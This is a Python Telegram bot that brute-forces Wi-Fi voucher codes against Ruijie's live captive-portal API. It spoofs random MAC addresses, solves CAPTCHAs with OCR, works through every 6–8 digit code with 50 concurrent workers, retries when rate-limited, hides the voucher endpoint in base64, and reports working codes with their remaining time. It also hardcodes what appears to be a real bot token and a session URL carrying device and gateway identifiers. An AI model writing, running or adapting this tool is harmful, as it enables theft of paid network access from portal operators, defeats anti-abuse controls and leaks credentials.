#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==============================================
#  Ruijie Voucher Scanner Bot  —  v7.0
#  Telegram bot version of ruijie_code_hack_main.py
#  Commands:
#    /start        — ကြိုဆို + ညွှန်ကြား
#    /seturl <url> — Session URL ထည့်
#    /scan 6|7|8   — scan စတင် (6/7/8 လုံး)
#    /scan random  — random 8-digit infinite
#    /status       — stats ကြည့်
#    /stop         — scan ရပ်
#    /result       — တွေ့တဲ့ code တွေ ကြည့်
# ==============================================

import telebot, asyncio, aiohttp, base64, random, re, os, string, time
from telebot.async_telebot import AsyncTeleBot

try:
    import cv2
    import ddddocr
    import numpy as np
    _HAS_OCR = True
except ImportError:
    _HAS_OCR = False

# =============================================
#  CONFIG — Environment Variable မှ ဖတ်ယူမည်
# =============================================
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8992896661:AAGRRhUul9nZLJL8DkEENuSIwnd-FawFafo")
ADMIN_ID  = "8937162965"  # owner telegram id
TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=9cce887e2b7e&gw_sn=H1U72QB006007&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.46&mac=30:f2:3c:ef:bf:37&slot_num=8&nasip=192.168.1.38&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C140&chap_challenge=%5C037%5C061%5C072%5C122%5C040%5C141%5C252%5C331%5C122%5C375%5C042%5C015%5C130%5C263%5C365%5C222%5C"
THREADS = 50
# =============================================

bot = AsyncTeleBot(BOT_TOKEN)

# per-user state
user_sessions = {}   # chat_id -> {"url": ..., "task": ..., "stop": False, "stats": {...}}
_connector = None
_ocr = None

# =============================================
#  H4CK3R ENGINE — Network helpers
# =============================================
def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(sess, session_url, previous=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else previous
    except:
        return previous


# =============================================
#  H4CK3R ENGINE — Captcha (ddddocr + OpenCV)
# =============================================
def _init_ocr():
    global _ocr
    if _ocr is None and _HAS_OCR:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = _init_ocr()
    if ocr is None:
        return None
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    return ocr.classification(buf.tobytes()).upper()

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Captcha_Image(sess, session_id):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': session_id, '_t': str(time.time())},
        headers=h, ssl=False
    ) as r:
        return await r.read()

async def Varify_Captcha(sess, session_id, text):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=h, json={'sessionId': session_id, 'authCode': text}, ssl=False
    ) as r:
        d = await r.json()
        return session_id if d.get("success") is True else None


# =============================================
#  H4CK3R ENGINE — Balance check
# =============================================
async def Code_Expires_Date(session_id):
    h_macc2 = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }
    endpoints = [
        (f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', h_auth),
        (f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}', h_macc2),
    ]
    for url, headers in endpoints:
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=15)
            ) as s:
                async with s.get(url, headers=headers, ssl=False) as r:
                    data = await r.json()
                    res = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')
                    remaining = res.get('remainingMinutes')
                    if remaining is not None:
                        remaining = int(remaining)
                        if remaining >= 0:
                            hh, mm = divmod(remaining, 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        else:
                            time_str = f"Expired ({remaining} mins)"
                        return f"Plan: {plan} | Time: {time_str}"
                    total = res.get('totalMinutes')
                    if total is not None:
                        hh, mm = divmod(int(total), 60)
                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        return f"Plan: {plan} | Time: {time_str}"
        except:
            continue
    return "Plan:Unknown | Time:Unknown"


# =============================================
#  H4CK3R ENGINE — Voucher POST
# =============================================
_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()


# =============================================
#  H4CK3R ENGINE — Core voucher check (per-user stats)
# =============================================
async def perform_check(session_url, code, chat_id):
    stats = user_sessions.get(chat_id, {}).get("stats")
    if stats is None:
        return

    for attempt in range(3):
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=30)
        ) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                return

            auth_code = None
            if _HAS_OCR:
                for _ in range(8):
                    try:
                        img = await Captcha_Image(sess, session_id)
                        text = await Captcha_Text(img)
                        if not text:
                            continue
                        verified = await Varify_Captcha(sess, session_id, text)
                        if verified:
                            auth_code = text
                            break
                    except:
                        pass

            if not auth_code:
                if not _HAS_OCR:
                    auth_code = ""
                else:
                    return

            if user_sessions.get(chat_id, {}).get("stop"):
                return

            payload = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                              "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
                    response = await r.text()
            except:
                return

        if 'request limited' in response:
            stats["limits"] += 1
            await asyncio.sleep(0.5)
            continue
        break
    else:
        return

    stats["tried"] += 1
    stats["current_code"] = code

    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        stats["hits"] += 1
        stats["hit_codes"].append(f"{code} | {info}")
        try:
            await bot.send_message(
                chat_id,
                f"✅ <b>Voucher Found!</b>\n\n"
                f"<b>Code:</b> <code>{code}</code>\n"
                f"<b>Info:</b> {info}\n\n"
                f"⏱ Plan: {info}",
                parse_mode="HTML"
            )
        except:
            pass

    elif 'STA' in response:
        info = await Code_Expires_Date(session_id)
        stats["expired"] += 1
        try:
            await bot.send_message(
                chat_id,
                f"⚠️ <b>Limited Code</b>\n\n"
                f"<b>Code:</b> <code>{code}</code>\n"
                f"<b>Info:</b> {info}",
                parse_mode="HTML"
            )
        except:
            pass


# =============================================
#  CODE ITERATORS
# =============================================
def iter_range_codes(start, end):
    digits = max(len(str(start)), len(str(end)))
    codes = [str(i).zfill(digits) for i in range(start, end + 1)]
    random.shuffle(codes)
    for c in codes:
        yield c

def iter_random_codes(length):
    while True:
        yield "".join(random.choice(string.digits) for _ in range(length))


# =============================================
#  ASYNC SCAN RUNNER (per-user)
# =============================================
async def run_scan(chat_id, session_url, start_code, end_code, workers, mode="range"):
    global _connector

    _init_ocr()

    if _connector is None or _connector.closed:
        _connector = aiohttp.TCPConnector(limit=workers + 200, ssl=False)

    sem = asyncio.Semaphore(workers)
    stats = user_sessions[chat_id]["stats"]

    if mode == "random":
        code_iter = iter_random_codes(8)
    else:
        code_iter = iter_range_codes(start_code, end_code)

    # progress updater
    async def update_progress():
        msg_id = user_sessions[chat_id].get("progress_msg_id")
        while not user_sessions[chat_id]["stop"]:
            await asyncio.sleep(5)
            elapsed = time.time() - stats["start_time"]
            speed = stats["tried"] / elapsed if elapsed > 0 else 0
            text = (
                "⚡ <b>Scanner Running</b> ⚡\n\n"
                f"🔍 Tried: <b>{stats['tried']}</b>\n"
                f"🎯 Current: <code>{stats['current_code'] or '---'}</code>\n"
                f"🟢 Hits: <b>{stats['hits']}</b>\n"
                f"🔴 Expired: <b>{stats['expired']}</b>\n"
                f"🟣 Limits: <b>{stats['limits']}</b>\n"
                f"⚡ Speed: <b>{speed:.1f} c/s</b>"
            )
            try:
                if msg_id:
                    await bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML")
            except:
                pass

    asyncio.create_task(update_progress())

    try:
        while not user_sessions[chat_id]["stop"]:
            batch = []
            for _ in range(200):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with sem:
                    await perform_check(session_url, c, chat_id)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)

    except asyncio.CancelledError:
        pass
    finally:
        user_sessions[chat_id]["stop"] = True

    # final
    elapsed = time.time() - stats["start_time"]
    hit_list = stats["hit_codes"]
    summary = (
        f"🏁 <b>Scan Finished</b>\n\n"
        f"⏱ Time: {elapsed:.1f}s\n"
        f"🔍 Tried: {stats['tried']}\n"
        f"🟢 Hits: {stats['hits']}\n"
        f"🔴 Expired: {stats['expired']}\n"
        f"🟣 Limits: {stats['limits']}"
    )
    if hit_list:
        summary += "\n\n📋 <b>Found Codes:</b>\n" + "\n".join(hit_list[:20])
    try:
        await bot.send_message(chat_id, summary, parse_mode="HTML")
    except:
        pass


# =============================================
#  BOT COMMANDS
# =============================================
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    chat_id = message.chat.id
    await bot.reply_to(
        message,
        "🤖 <b>Ruijie Voucher Scanner Bot</b>\n\n"
        "📖 <b>Commands:</b>\n"
        "/seturl &lt;url&gt; — Session URL ထည့်\n"
        "/scan 6 — 6-digit scan (000000-999999)\n"
        "/scan 7 — 7-digit scan (0000000-9999999)\n"
        "/scan 8 — 8-digit scan\n"
        "/scan random — random 8-digit infinite\n"
        "/status — လက်ရှိ stats ကြည့်\n"
        "/stop — scan ရပ်\n"
        "/result — တွေ့တဲ့ code တွေ ကြည့်\n\n"
        "⚠️ အရင် /seturl နဲ့ URL ထည့်ပါ။",
        parse_mode="HTML"
    )


@bot.message_handler(commands=['seturl'])
async def cmd_seturl(message):
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        url = TARGET_URL
    else:
        url = args[1].strip()

    if chat_id not in user_sessions:
        user_sessions[chat_id] = {"url": None, "task": None, "stop": True, "stats": {}}
    user_sessions[chat_id]["url"] = url

    await bot.reply_to(
        message,
        f"✅ <b>Session URL သတ်မှတ်ပြီး</b>\n\n"
        f"<code>{url[:60]}...</code>\n\n"
        "ယခု /scan 6  သို့မဟုတ်  /scan 7  သို့မဟုတ်  /scan 8  နဲ့ scan စတင်ပါ။",
        parse_mode="HTML"
    )


@bot.message_handler(commands=['scan'])
async def cmd_scan(message):
    chat_id = message.chat.id
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "Usage:\n\n/scan 6\n/scan 7\n/scan 8\n/scan random"
        )
        return

    mode = args[1].strip().lower()

    if chat_id not in user_sessions or not user_sessions[chat_id].get("url"):
        await bot.reply_to(message, "❌ အရင် /seturl &lt;url&gt; နဲ့ Session URL ထည့်ပါ။")
        return

    task = user_sessions[chat_id].get("task")
    if task and not task.done():
        await bot.reply_to(message, "⚠️ scan က ဆက် run နေသေးပါ။ /stop နဲ့ ရပ်ပြီးမှ ပြန်စပါ။")
        return

    if mode == "6":
        start_code, end_code, smode = 0, 999999, "range"
        label = "6-digit (000000-999999)"
    elif mode == "7":
        start_code, end_code, smode = 0, 9999999, "range"
        label = "7-digit (0000000-9999999)"
    elif mode == "8":
        start_code, end_code, smode = 0, 99999999, "range"
        label = "8-digit (00000000-99999999)"
    elif mode == "random":
        start_code, end_code, smode = 0, 0, "random"
        label = "Random 8-digit (infinite)"
    else:
        await bot.reply_to(message, "❌ mode မှားပါ။ /scan 6, 7, 8, random ထဲက ရွေးပါ။")
        return

    user_sessions[chat_id]["stats"] = {
        "tried": 0,
        "hits": 0,
        "expired": 0,
        "limits": 0,
        "current_code": "",
        "hit_codes": [],
        "start_time": time.time()
    }
    user_sessions[chat_id]["stop"] = False

    progress_msg = await bot.send_message(
        chat_id,
        "⚡ <b>Scanner Running</b> ⚡\n\n"
        f"🎯 Mode: {label}\n"
        "🔍 Tried: 0\n"
        "🟢 Hits: 0\n"
        "🔴 Expired: 0\n"
        "🟣 Limits: 0\n"
        "⚡ Speed: 0 c/s",
        parse_mode="HTML"
    )
    user_sessions[chat_id]["progress_msg_id"] = progress_msg.message_id

    workers = THREADS
    url = user_sessions[chat_id]["url"]
    task = asyncio.create_task(
        run_scan(chat_id, url, start_code, end_code, workers, mode=smode)
    )
    user_sessions[chat_id]["task"] = task


@bot.message_handler(commands=['status'])
async def cmd_status(message):
    chat_id = message.chat.id
    s = user_sessions.get(chat_id)
    if not s or not s.get("stats"):
        await bot.reply_to(message, "❌ scan မရှိသေးပါ။ /scan 6 နဲ့ စတင်ပါ။")
        return
    stats = s["stats"]
    elapsed = time.time() - stats["start_time"]
    speed = stats["tried"] / elapsed if elapsed > 0 else 0
    running = "🟢 Running" if not s["stop"] else "🔴 Stopped"
    await bot.reply_to(
        message,
        f"📊 <b>Scan Status</b>  {running}\n\n"
        f"⏱ Time: {elapsed:.1f}s\n"
        f"🔍 Tried: {stats['tried']}\n"
        f"🎯 Current: <code>{stats['current_code'] or '---'}</code>\n"
        f"🟢 Hits: {stats['hits']}\n"
        f"🔴 Expired: {stats['expired']}\n"
        f"🟣 Limits: {stats['limits']}\n"
        f"⚡ Speed: {speed:.1f} c/s",
        parse_mode="HTML"
    )


@bot.message_handler(commands=['stop'])
async def cmd_stop(message):
    chat_id = message.chat.id
    s = user_sessions.get(chat_id)
    if not s:
        await bot.reply_to(message, "❌ scan မရှိပါ။")
        return
    s["stop"] = True
    task = s.get("task")
    if task and not task.done():
        task.cancel()
    await bot.reply_to(message, "🛑 scan ရပ်တန့်ပြီးပါ။")


@bot.message_handler(commands=['result'])
async def cmd_result(message):
    chat_id = message.chat.id
    s = user_sessions.get(chat_id)
    if not s or not s.get("stats"):
        await bot.reply_to(message, "❌ မတွေ့သေးပါ။")
        return
    hit_list = s["stats"]["hit_codes"]
    if not hit_list:
        await bot.reply_to(message, "📋 တွေ့တဲ့ code မရှိသေးပါ။")
        return
    text = "📋 <b>Found Codes:</b>\n\n" + "\n".join(hit_list[:30])
    await bot.reply_to(message, text, parse_mode="HTML")


# =============================================
#  MAIN
# =============================================
async def main():
    global _connector
    _connector = aiohttp.TCPConnector(limit=2000, ttl_dns_cache=300, ssl=False)
    print("[*] Ruijie Scanner Bot starting...")
    if not _HAS_OCR:
        print("[!] ddddocr မရှိပါ — pip install ddddocr opencv-python-headless numpy")
    else:
        print("[*] Captcha solver: ddddocr ✓")
    
    try:
        await bot.polling(non_stop=True)
    except Exception as e:
        print(f"[!] Bot polling error: {e}")
    finally:
        if _connector and not _connector.closed:
            await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
